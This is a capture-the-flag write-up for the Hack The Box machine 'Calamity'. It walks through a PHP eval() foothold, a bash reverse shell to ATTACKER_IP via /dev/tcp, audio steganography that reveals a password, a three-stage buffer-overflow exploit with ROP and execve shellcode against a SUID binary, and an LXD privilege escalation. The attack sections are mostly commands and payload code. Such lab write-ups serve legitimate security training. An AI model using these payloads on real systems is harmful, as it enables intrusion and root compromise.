# HTB: Calamity — Writeup

**Difficulty:** Hard | **OS:** Linux (x86 32-bit) | **IP:** 10.10.10.27

## Summary

Calamity starts with hardcoded credentials in an HTML comment granting access
to a PHP `eval()` panel. A process-name blacklist is bypassed by copying bash
to `/dev/shm`. Audio steganography (phase cancellation in Audacity) reveals the
user password. Root is achieved via a 3-stage exploit against a SUID binary:
information leak via EBX manipulation, admin bypass, and finally a ret2mprotect
ROP chain to make the stack executable and run shellcode. An LXD group
escalation is also valid.

---

## Enumeration

```bash
nmap -sV -sC -oA nmap/calamity 10.10.10.27
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

```bash
gobuster dir -x php -u http://10.10.10.27 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# /uploads  (301)
# /admin.php (200)
```

---

## Foothold — PHP eval() RCE

Credentials in `/admin.php` HTML source:

```html
<!-- password is:skoupidotenekes -->
```

Login: `admin / skoupidotenekes`

The panel evaluates user input via `eval()`. Test:

```
<?php system("id"); ?>
# uid=33(www-data)
```

### Blacklist Bypass

A monitor kills processes named `nc`, `python`, `bash`, `sh`.
Copy bash under a different name:

```
<?php system("cp /bin/bash /dev/shm/0xdf; chmod +xs /dev/shm/0xdf"); ?>
```

Reverse shell:

```
<?php system("/dev/shm/0xdf -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

Shell as `www-data`.

---

## Privilege Escalation — www-data → xalvas (Audio Steganography)

```bash
ls /home/xalvas/alarmclocks/
# rick.wav  recov.wav
```

`rick.wav` and `recov.wav` sound identical but differ at the binary level.

### Phase Cancellation in Audacity

1. Import `rick.wav` as Track 1
2. Import `recov.wav` as Track 2
3. Select Track 2 → **Effect > Invert** (flips phase)
4. Select both → **Tracks > Mix and Render**
5. The cover audio cancels out — only the hidden audio remains
6. Audio reveals the password: `18547936..*`

```bash
ssh xalvas@10.10.10.27  # password: 18547936..*
cat /home/xalvas/user.txt
```

**User flag captured.**

---

## Privilege Escalation — xalvas → root (3-Stage SUID Exploit)

**Binary:** `/home/xalvas/app/goodluck` — SUID root, source in `goodluck.c`
**Architecture:** x86 32-bit, ASLR disabled, NX enabled

### Struct Layout

```c
#define USIZE 12
struct f {
    char user[USIZE];  // +0x00 (12 bytes)
    int  secret;       // +0x0c
    int  admin;        // +0x10
    int  session;      // +0x14
} hey;                 // @ 0x80003068
```

`createusername()` uses no bounds check on `user[]`, allowing overflow into
`secret`, `admin`, and `session`.

The binary uses `EBX` as the struct base pointer. Controlling EBX shifts all
field accesses.

---

### Stage 1 — Information Leak (secret value)

Craft a payload that shifts EBX by -8, causing the program to read `hey.secret`
when it thinks it is reading `hey.session`. The debug menu prints the value.

```python
payload1 = b'A' * 8 + p32(struct_base - 8)
# secret value printed in debug output → leaked
```

---

### Stage 2 — Admin Bypass

With the leaked `secret`, craft a payload that writes the correct secret and
sets `admin = 1` by shifting EBX by -4.

```python
payload2 = p32(leaked_secret) + b'B' * 4 + p32(0x1)
# admin check passes → debug() menu unlocked
```

---

### Stage 3 — ret2mprotect + Shellcode

`debug()` reads 100 bytes into a 64-byte buffer. Return address at offset 76.

NX is enabled — stack is not executable. Use `mprotect()` to make it RWX,
then return into shellcode.

```python
mprotect_addr = 0xb7efcd50
pop3ret       = 0xb7fdac31   # pop/pop/pop/ret gadget
stack_base    = 0xbfedf000
stack_size    = 0x121000
PROT_RWX      = 0x7

shellcode  = b'\x31\xc0\x31\xdb\xb0\x17\xcd\x80'  # setuid(0)
shellcode += b'\x31\xd2\x52\x68\x2f\x2f\x73\x68'
shellcode += b'\x68\x2f\x62\x69\x6e\x89\xe3\x52'
shellcode += b'\x53\x89\xe1\xb0\x0b\xcd\x80'       # execve /bin/sh

payload3  = b'\x90' * 10
payload3 += shellcode
payload3 += b'A' * (76 - 10 - len(shellcode))
payload3 += p32(mprotect_addr)
payload3 += p32(pop3ret)
payload3 += p32(stack_base)
payload3 += p32(stack_size)
payload3 += p32(PROT_RWX)
payload3 += p32(buf_addr)       # printed by debug() each run
```

```bash
# uid=0(root)
cat /root/root.txt
```

**Root flag captured.**

---

### Alternative — LXD Group Escalation

`xalvas` is also in the `lxd` group. Faster path:

```bash
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
cat /mnt/root/root/root.txt
```

---

## Attack Chain

```
gobuster → /admin.php
  → credentials in HTML comment (admin:skoupidotenekes)
  → eval() PHP RCE → process blacklist bypass via /dev/shm
  → www-data shell
  → /home/xalvas/alarmclocks/ → Audacity phase cancellation
  → password 18547936..* → SSH xalvas → user.txt
  → SUID goodluck (goodluck.c, x86, ASLR off, NX on)
  → Stage 1: EBX -8 → leak hey.secret
  → Stage 2: EBX -4 → admin=1 bypass
  → Stage 3: ret2mprotect → ROP → stack RWX → shellcode → root
  → root.txt
```

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Service enumeration |
| gobuster | Web directory discovery |
| Audacity | Audio steganography (phase cancellation) |
| gdb + PEDA | Binary analysis and exploit development |
| pwntools | Exploit scripting |
| ROPgadget | ROP gadget search |
| lxc | LXD group escalation (alternative) |
